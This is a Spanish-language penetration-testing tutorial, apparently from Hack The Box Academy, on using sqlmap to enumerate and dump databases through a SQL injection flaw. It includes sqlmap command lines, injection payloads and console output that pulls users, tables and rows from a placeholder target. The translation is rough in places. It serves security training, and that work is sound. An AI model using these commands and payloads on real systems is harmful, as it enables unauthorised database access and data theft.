# Database Enumeration

La enumeración representa la parte central de un ataque de inyección SQL, que se realiza justo después de la detección exitosa y la confirmación de la explotabilidad de la vulnerabilidad SQLI específica. Consiste en búsqueda y recuperación (es decir, exfiltración) de toda la información disponible de la base de datos vulnerable.

---

# **Exfiltración de datos SQLMAP**

Para tal propósito, SQLMAP tiene un conjunto predefinido de consultas para todos los DBMS compatibles, donde cada entrada representa el SQL que debe ejecutarse en el objetivo para recuperar el contenido deseado. Por ejemplo, los extractos de[consultas.xml](https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/queries.xml)Para un MySQL DBMS se puede ver a continuación:

Código:xml

```xml
<?xml version="1.0" encoding="UTF-8"?>

<root><dbms value="MySQL"><!-- http://dba.fyicenter.com/faq/mysql/Difference-between-CHAR-and-NCHAR.html -->
        <cast query="CAST(%s AS NCHAR)"/><length query="CHAR_LENGTH(%s)"/><isnull query="IFNULL(%s,' ')"/>
...SNIP...
        <banner query="VERSION()"/><current_user query="CURRENT_USER()"/><current_db query="DATABASE()"/><hostname query="@@HOSTNAME"/><table_comment query="SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"/><column_comment query="SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"/><is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/><check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"/><users><inband query="SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES" query2="SELECT user FROM mysql.user" query3="SELECT username FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/><blind query="SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT %d,1" query2="SELECT DISTINCT(user) FROM mysql.user LIMIT %d,1" query3="SELECT DISTINCT(username) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS LIMIT %d,1" count="SELECT COUNT(DISTINCT(grantee)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES" count2="SELECT COUNT(DISTINCT(user)) FROM mysql.user" count3="SELECT COUNT(DISTINCT(username)) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/></users>
    ...SNIP...

```

Por ejemplo, si un usuario quiere recuperar el "banner" (conmutador`--banner`) para el objetivo basado en MySQL DBMS, el`VERSION()`La consulta se utilizará para tal propósito.

En caso de recuperación del nombre de usuario actual (conmutador`--current-user`), el`CURRENT_USER()`La consulta se utilizará.

Otro ejemplo es recuperar todos los nombres de usuario (es decir, etiqueta`<users>`). Se utilizan dos consultas, dependiendo de la situación. La consulta marcada como`inband`se usa en todas las situaciones no cerveceras (es decir, SQLI basada en errores y que se basan en errores), donde los resultados de la consulta se pueden esperar dentro de la respuesta en sí. La consulta marcada como`blind`, por otro lado, se usa para todas las situaciones ciegas, donde los datos deben recuperarse fila por fila, columna por columna y bit a bit.

---

# **Enumeración básica de datos de DB**

Por lo general, después de una detección exitosa de una vulnerabilidad SQLI, podemos comenzar la enumeración de los detalles básicos de la base de datos, como el nombre de host del objetivo vulnerable (`--hostname`), nombre actual del usuario (`--current-user`), nombre de la base de datos actual (`--current-db`), o hashes de contraseña (`--passwords`). SQLMAP omitirá la detección de SQLI si se ha identificado anteriormente y iniciará directamente el proceso de enumeración de DBMS.

La enumeración generalmente comienza con la recuperación de la información básica:

- Banner de versión de base de datos (conmutador`-banner`)
- Nombre de usuario actual (conmutador`-current-user`)
- Nombre de la base de datos actual (conmutador`-current-db`)
- Verificar si el usuario actual tiene derechos de DBA (administrador) (conmutación`-is-dba`)

El siguiente comando sqlmap hace todo lo anterior:

Enumeración de la base de datos

```
xnoxos@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.9}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 13:30:57 /2020-09-17/

[13:30:57] [INFO] resuming back-end DBMS 'mysql'
[13:30:57] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 5134=5134

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 5907 FROM(SELECT COUNT(*),CONCAT(0x7170766b71,(SELECT (ELT(5907=5907,1))),0x7178707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170766b71,0x7a76726a6442576667644e6b476e577665615168564b7a696a6d4646475159716f784f5647535654,0x7178707671)-- -
---
[13:30:57] [INFO] the back-end DBMS is MySQL
[13:30:57] [INFO] fetching banner
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: MySQL >= 5.0
banner: '5.1.41-3~bpo50+1'
[13:30:58] [INFO] fetching current user
current user: 'root@%'
[13:30:58] [INFO] fetching current database
current database: 'testdb'
[13:30:58] [INFO] testing if current user is DBA
[13:30:58] [INFO] fetching current user
current user is DBA: True
[13:30:58] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/www.example.com'

[*] ending @ 13:30:58 /2020-09-17/

```

Del ejemplo anterior, podemos ver que la versión de la base de datos es bastante antigua (MySQL 5.1.41 - a partir de noviembre de 2009), y el nombre de usuario actual es`root`, mientras que el nombre de la base de datos actual es`testdb`.

Nota: El usuario 'raíz' en el contexto de la base de datos en la gran mayoría de los casos no tiene ninguna relación con el usuario del sistema operativo "raíz", aparte de eso que representa al usuario privilegiado dentro del contexto DBMS. Básicamente, esto significa que el usuario de DB no debe tener ninguna restricción dentro del contexto de la base de datos, mientras que los privilegios del sistema operativo (por ejemplo, la redacción del sistema de archivos a la ubicación arbitraria) deberían ser minimalistas, al menos en las implementaciones recientes. El mismo principio se aplica para el rol genérico 'DBA'.

---

# **Enumeración de la mesa**

En los escenarios más comunes, después de encontrar el nombre actual de la base de datos (es decir,`testdb`), la recuperación de los nombres de la tabla sería utilizando el`--tables`opción y especificando el nombre de DB con`-D testdb`, es el siguiente:

Enumeración de la base de datos

```
xnoxos@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb...SNIP...
[13:59:24] [INFO] fetching tables for database: 'testdb'
Database: testdb
[4 tables]
+---------------+
| member        |
| data          |
| international |
| users         |
+---------------+

```

Después de detectar el nombre de interés de la tabla, la recuperación de su contenido se puede hacer utilizando el`--dump`opción y especificando el nombre de la tabla con`-T users`, como sigue:

Enumeración de la base de datos

```
xnoxos@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb...SNIP...
Database: testdb

Table: users
[4 entries]
+----+--------+------------+
| id | name   | surname    |
+----+--------+------------+
| 1  | luther | blisset    |
| 2  | fluffy | bunny      |
| 3  | wu     | ming       |
| 4  | NULL   | nameisnull |
+----+--------+------------+

[14:07:18] [INFO] table 'testdb.users' dumped to CSV file '/home/user/.local/share/sqlmap/output/www.example.com/dump/testdb/users.csv'

```

La salida de la consola muestra que la tabla se descarta en formato CSV formateado a un archivo local,`users.csv`.

Consejo: aparte del CSV predeterminado, podemos especificar el formato de salida con la opción `--Dump-format` a HTML o SQLite, para que luego podamos investigar más a fondo el DB en un entorno SQLite.

![](https://academy.hackthebox.com/storage/modules/58/pVBXxRz.png)

---

# **Enumeración de tabla/fila**

Al tratar con tablas grandes con muchas columnas y/o filas, podemos especificar las columnas (por ejemplo, solo`name`y`surname`columnas) con el`-C`Opción, como sigue:

Enumeración de la base de datos

```
xnoxos@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname...SNIP...
Database: testdb

Table: users
[4 entries]
+--------+------------+
| name   | surname    |
+--------+------------+
| luther | blisset    |
| fluffy | bunny      |
| wu     | ming       |
| NULL   | nameisnull |
+--------+------------+

```

Para reducir las filas en función de sus números ordinales dentro de la tabla, podemos especificar las filas con el`--start`y`--stop`Opciones (por ejemplo, comenzar desde la segunda hasta la tercera entrada), como sigue:

Enumeración de la base de datos

```
xnoxos@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3...SNIP...
Database: testdb

Table: users
[2 entries]
+----+--------+---------+
| id | name   | surname |
+----+--------+---------+
| 2  | fluffy | bunny   |
| 3  | wu     | ming    |
+----+--------+---------+

```

---

# **Enumeración condicional**

Si existe el requisito de recuperar ciertas filas en función de una conocida`WHERE`condición (por ejemplo`name LIKE 'f%'`), podemos usar la opción`--where`, como sigue:

Enumeración de la base de datos

```
xnoxos@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"...SNIP...
Database: testdb

Table: users
[1 entry]
+----+--------+---------+
| id | name   | surname |
+----+--------+---------+
| 2  | fluffy | bunny   |
+----+--------+---------+

```

---

# **Enumeración completa de DB**

En lugar de recuperar contenido por base de mesa única, podemos recuperar todas las tablas dentro de la base de datos de interés omitiendo el uso de la opción`-T`en total (por ejemplo`--dump -D testdb`). Simplemente usando el interruptor`--dump`sin especificar una tabla con`-T`, se recuperará todo el contenido de la base de datos actual. En cuanto a la`--dump-all`Cambiar, se recuperará todo el contenido de todas las bases de datos.

En tales casos, también se recomienda a un usuario que incluya el interruptor`--exclude-sysdbs`(p.ej`--dump-all --exclude-sysdbs`), que instruirá a SQLMAP que saltea la recuperación del contenido de las bases de datos del sistema, ya que generalmente es de poco interés para los pentestres.